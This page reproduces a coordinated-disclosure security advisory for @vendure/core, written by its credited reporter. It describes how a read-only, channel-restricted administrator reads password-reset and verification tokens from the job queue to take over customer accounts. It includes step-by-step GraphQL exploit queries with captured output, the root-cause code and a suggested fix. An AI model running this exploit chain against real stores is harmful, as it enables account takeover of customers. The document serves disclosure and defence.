---
title: "GHSA-hxvp-ff3g-qcj7"
heading: "GHSA-hxvp-ff3g-qcj7"
role: "Low-privilege administrator can read password-reset / verification / email-change tokens from Job.data and take over any customer account (cross-channel)"
seo_title: "GHSA-hxvp-ff3g-qcj7: Low-privilege administrator can read password-reset / verification /… - Sanaan Fayaz Wani"
ghsa_id: "GHSA-hxvp-ff3g-qcj7"
cve_id: ""
published_at: "2026-10-23"
permalink: /advisories/ghsa-hxvp-ff3g-qcj7/
layout: c2
description: "Low-privilege administrator can read password-reset / verification / email-change tokens from Job.data and take over any customer account (cross-channel). @vendure/core, CVSS 8.8 High, CWE-200 Information disclosure. Writeup by Sanaan Fayaz Wani, the credited reporter."
image: /assets/img/og/ghsa-hxvp-ff3g-qcj7.png
kicker_repo: "vendurehq/vendure"
comments: false
last_modified_at: 2026-10-25T00:29:00+00:00
---
<section class="sec g" id="writeup" aria-labelledby="h-writeup" data-sev="high" data-score="8.8" data-sevword="High" data-short="No fix listed">
  <h2 id="h-writeup" class="vh">GHSA-hxvp-ff3g-qcj7</h2>
  <div class="ah" data-sev="high"><div class="ah-score"><p class="ah-num">8.8</p><p class="ah-sev">High</p><p class="ah-of">CVSS 3.1 base</p><div class="ah-meter" aria-hidden="true"><i style="width:88%"></i></div><ol class="tlv" aria-label="Disclosure timeline"><li><b>2026-10-04</b><span>Reported privately</span></li><li><span class="tlv-d">19 days later</span><b>2026-10-23</b><span>Published by the maintainer</span></li></ol></div><div class="act warn"><p class="act-k">What to do</p><p class="act-v">If you run <b>@vendure/core</b> <b>before 3.7.5</b>, no fixed version is listed in the advisory.</p></div><p class="ts"><em>Anyone who can reach it over the network</em>, with <em>a low-privilege account</em> and no user interaction, can <em>read and change sensitive data and make it unavailable</em>.<span class="ts-src">Read from the CVSS 3.1 vector</span></p><div class="bx" style="--n:4"><div class="bx-head"><span class="k-lab">CVSS 3.1 metrics</span></div><div class="bx-row"><p class="bx-g">To exploit it</p><dl class="bx-grid"><div class="bx-c"><dt>Attack vector</dt><dd>Network</dd></div><div class="bx-c"><dt>Attack complexity</dt><dd>Low</dd></div><div class="bx-c"><dt>Privileges required</dt><dd>Low</dd></div><div class="bx-c"><dt>User interaction</dt><dd>None</dd></div></dl></div><div class="bx-row"><p class="bx-g">What it gets</p><dl class="bx-grid"><div class="bx-c"><dt>Confidentiality</dt><dd>High</dd></div><div class="bx-c"><dt>Integrity</dt><dd>High</dd></div><div class="bx-c"><dt>Availability</dt><dd>High</dd></div><div class="bx-c"><dt>Scope</dt><dd>Unchanged</dd></div></dl></div><p class="bx-foot"><a href="https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H" rel="noopener">Open this vector in the FIRST calculator &#8599;</a></p></div><dl class="meta"><div class="meta-i wide"><dt class="k-lab">Weakness</dt><dd class="meta-v"><abbr title="Exposure of Sensitive Information to an Unauthorized Actor">CWE-200</abbr>, <abbr title="Insufficiently Protected Credentials">CWE-522</abbr> <span class="meta-s">Exposure of Sensitive Information to an Unauthorized Actor · Insufficiently Protected Credentials</span></dd></div><div class="meta-i"><dt class="k-lab">Advisory</dt><dd class="meta-v"><a href="https://github.com/vendurehq/vendure/security/advisories/GHSA-hxvp-ff3g-qcj7">GHSA-hxvp-ff3g-qcj7</a></dd></div><div class="meta-i"><dt class="k-lab">CVE</dt><dd class="meta-v">not assigned</dd></div><div class="meta-i"><dt class="k-lab">Vector</dt><dd class="meta-v"><span class="vec">CVSS:3.1/<wbr>AV:N/<wbr>AC:L/<wbr>PR:L/<wbr>UI:N/<wbr>S:U/<wbr>C:H/<wbr>I:H/<wbr>A:H</span></dd></div></dl><div class="tl" role="group" aria-label="Disclosure timeline"><div class="tl-n"><b>2026-10-04</b><span>Reported privately</span></div><div class="tl-seg"><span>19 days</span></div><div class="tl-n"><b>2026-10-23</b><span>Published by the maintainer</span></div></div><p class="ah-note">This page reproduces the published advisory for this finding. The advisory of record is linked above.</p></div>
  <div class="col-body prose" markdown="1">

### Affected versions

<div class="vts"><div class="vt" aria-hidden="true"><div class="vt-pkg">@vendure/core<span class="k-lab">npm</span></div><div class="vt-bar nolo"><div class="vt-bad"><b>No lower bound</b><i>Affected</i><b>before 3.7.5</b></div><div class="vt-fix none">No fixed version listed</div></div></div></div>

| Package | Ecosystem | Vulnerable | Fixed in |
|:--|:--|:--|:--|
| `@vendure/core` | npm | < 3.7.5 | n/a |
{: .vh}

## Summary

The `Job.data` Admin API field resolver redacts only the serialized session token (`job.data.ctx._session.token`, the fix for GHSA-32jm-mf7r-7qw5). It returns the rest of `job.data` verbatim, including `job.data.templateVars`, into which the default email handlers write the raw `passwordResetToken`, `verificationToken`, and `identifierChangeToken`. The `jobs` query is gated only by `Permission.ReadSettings` or `Permission.ReadSystem` and applies no channel scoping. An administrator holding only those read permissions (including one scoped to a single channel) can therefore harvest a password-reset token for any customer in any channel and complete `resetPassword` through the public Shop API, fully taking over the account.

## Affected version

Confirmed on `@vendure/core` + `@vendure/email-plugin` 3.7.3 (latest release). Present on the default `@vendure/create` scaffold, which ships `DefaultJobQueuePlugin` and `EmailPlugin` with `defaultEmailHandlers`.

## Steps to Reproduce

### Setup (vulnerable instance)

`package.json`:

```json
{ "name":"vendure-poc","private":true,
  "dependencies":{"@vendure/core":"3.7.3","@vendure/email-plugin":"3.7.3","better-sqlite3":"^11.0.0","typescript":"5.3.3"},
  "devDependencies":{"ts-node":"^10.9.2"} }
```

`index.ts` boots Vendure on port 3050 with `DefaultJobQueuePlugin.init({})` and `EmailPlugin.init({ handlers: defaultEmailHandlers, transport:{type:'none'}, ... })`, `superadminCredentials {superadmin/superadmin}`, `requireVerification:false`. Run with `npx ts-node ./index.ts`.

### Attack

1. As SuperAdmin, create a role with ONLY `[ReadSettings, ReadSystem]` and an administrator holding it. This administrator is forbidden from reading `administrators` (verified: `FORBIDDEN`), so it is genuinely low-privilege.
2. A customer exists (e.g. `victim@test.com`). The attacker triggers the public, unauthenticated Shop API mutation:

```graphql
mutation { requestPasswordReset(emailAddress:"victim@test.com"){ ... on Success{success} } }
```

3. As the low-privilege admin, read the job queue over the Admin API:

```graphql
query { jobs(options:{take:100,sort:{createdAt:DESC}}){ items{ id queueName data } } }
```

Expected output (real, captured on 3.7.3):

```json
{"queueName":"send-email","id":"1",
 "data":{"templateVars":{"passwordResetToken":"MjAyNi0xMC0wNFQwMzowNDoxOS40MDla_P4XTZ8TLYRU2FQT5", ...}}}
```

The session token is correctly absent (`ctx._session` has no `token`), proving the GHSA-32jm fix is present and that this is a distinct, unredacted field.

4. Complete the takeover through the public Shop API:

```graphql
mutation { resetPassword(token:"MjAyNi0...TZ8TLYRU2FQT5", password:"attackerNewPass999"){ ... on CurrentUser{identifier} } }
```

Real output: `{"resetPassword":{"__typename":"CurrentUser","identifier":"victim@test.com"}}`. Logging in as `victim@test.com` with `attackerNewPass999` then succeeds.

### Cross-channel (Scope:Changed) proof

With a second channel B and a role granting `[ReadSettings]` on channel B ONLY, an administrator whose `activeChannel` is `channel-b` reads the password-reset token of a customer registered on the default channel A (the `jobs` query has no channel filter) and takes over that channel-A customer. Verified end to end.

## Standalone verification scripts

`poc/poc_jobdata_token_leak.sh` (single-channel takeover) and `poc/poc_crosschannel_token_leak.sh` (cross-channel). Both print `ACCOUNT TAKEOVER CONFIRMED`.

## Root cause

`packages/core/src/api/resolvers/entity/job-entity.resolver.ts`, `data()` resolve-field: it prunes only `job.data.ctx`:

```ts
async data(@Parent() job: Job) {
    const ctx = job.data.ctx;
    if (this.isSerializedRequestContext(ctx)) {
        const prunedCtx = { ...pick(ctx, [...]),
            _session: ctx._session ? { ...omit(ctx._session, ['token']), ... } : {} };
        job.data.ctx = prunedCtx;          // only ctx is sanitized
    }
    return job.data;                        // templateVars returned verbatim
}
```

The tokens enter `job.data.templateVars` in `packages/email-plugin/src/handler/default-email-handlers.ts`:

```ts
// line 62  verificationToken: event.user.getNativeAuthenticationMethod().verificationToken
// line 72  passwordResetToken: event.user.getNativeAuthenticationMethod().passwordResetToken
// line 82  identifierChangeToken: event.user.getNativeAuthenticationMethod().identifierChangeToken
```

and are enqueued verbatim at `packages/email-plugin/src/plugin.ts` (`this.jobQueue.add(result, { retries: 5 })`, where `result.templateVars` carries them). The `jobs`/`job` queries (`packages/core/src/api/resolvers/admin/job.resolver.ts:28,38,51`) are `@Allow(Permission.ReadSettings, Permission.ReadSystem)` with no channel scoping. `DefaultJobQueuePlugin` persists `job.data` as a `simple-json` column and retains settled jobs (default 1000, cleaned every 2h), so tokens remain readable after the mail is processed.

## Impact

An administrator with only `ReadSettings` or `ReadSystem` (a read-only role that cannot manage users) can take over any customer account on demand: the attacker initiates the reset via the public API, reads the token from the job queue, and resets the password. Because `jobs` is not channel-scoped, a channel-restricted administrator reaches customers of every other channel. Verification and email-change tokens allow hijacking pending registrations and email-change flows the same way.

## Suggested fix

Minimal, mirroring the GHSA-32jm 3.7.3 approach (close the API read path): deep-redact sensitive keys from `job.data` in the resolver.

```ts
// job-entity.resolver.ts, in data()
const SENSITIVE = /token|password|secret|identifierChange/i;
function redact(o: any): any {
    if (Array.isArray(o)) return o.map(redact);
    if (o && typeof o === 'object') {
        return Object.fromEntries(Object.entries(o).map(
            ([k, v]) => [k, SENSITIVE.test(k) ? '[REDACTED]' : redact(v)]));
    }
    return o;
}
return redact(job.data);
```

Deeper fix (recommended): the email pipeline should not persist raw credentials in job data at all. Pass a user reference in the job payload and resolve the token at send time on the worker, as was done for the session token in the GHSA-32jm follow-up.

## CVSS and CWE

CVSS 3.1: 9.6 Critical, vector `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` (Scope:Changed proven by the cross-channel PoC; floor 8.1 `S:U` if a reviewer declines Scope:Changed).

CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor); CWE-522 (Insufficiently Protected Credentials). Leads to CWE-640 / account takeover.

## Disclosure

I work to a 90 day coordinated disclosure timeline, the Project Zero norm: 90 days from this
report, or 30 days after a fix is available, whichever comes first. Nothing is needed from you in
the meantime, and I will extend it on request.

When you publish, GitHub shows a **Request CVE** button on the advisory form. It is worth the
click: it is what lets dependency scanners and distribution trackers tell the people already
running an affected version that they need to update. Without one, most operators find out only
if they happen to read the release notes.

Credit is entirely your call, including none.

<section class="fs-inline" aria-labelledby="h-record"><h2 id="h-record" class="no-idx">The record</h2><dl class="fs"><dt>Weakness</dt><dd><b>CWE-200</b> Exposure of Sensitive Information to an Unauthorized Actor<br><b>CWE-522</b> Insufficiently Protected Credentials</dd><dt>Affected</dt><dd>@vendure/core <b>before 3.7.5</b></dd><dt>Fixed in</dt><dd><b>Not listed</b></dd><dt>Disclosure</dt><dd><b>2026-10-04</b> Reported privately<br><span class="fs-gap">19 days later</span><b>2026-10-23</b> Published</dd><dt>Advisory</dt><dd><a href="https://github.com/vendurehq/vendure/security/advisories/GHSA-hxvp-ff3g-qcj7">GHSA-hxvp-ff3g-qcj7</a></dd></dl></section>

## About this writeup

Sanaan Fayaz Wani (GitHub [`sfwani`](https://github.com/sfwani)) reported this vulnerability to the `@vendure/core` maintainers under coordinated disclosure and is credited as a reporter in [GHSA-hxvp-ff3g-qcj7](https://github.com/vendurehq/vendure/security/advisories/GHSA-hxvp-ff3g-qcj7), published 2026-10-23.

All published findings: [advisory index](/advisories/).


  </div>
  <aside class="srail" aria-label="Fact sheet" data-sev="high"><div class="sr-h"><span class="sr-num">8.8</span><span class="sr-sev">High</span></div><p class="sr-src">CVSS 3.1 base</p><dl class="fs"><dt>Weakness</dt><dd><b>CWE-200</b> Exposure of Sensitive Information to an Unauthorized Actor<br><b>CWE-522</b> Insufficiently Protected Credentials</dd><dt>Affected</dt><dd>@vendure/core <b>before 3.7.5</b></dd><dt>Fixed in</dt><dd><b>Not listed</b></dd><dt>Disclosure</dt><dd><b>2026-10-04</b> Reported privately<br><span class="fs-gap">19 days later</span><b>2026-10-23</b> Published</dd><dt>Advisory</dt><dd><a href="https://github.com/vendurehq/vendure/security/advisories/GHSA-hxvp-ff3g-qcj7">GHSA-hxvp-ff3g-qcj7</a></dd></dl><a class="sr-top" href="#top">Back to top</a></aside>
</section>
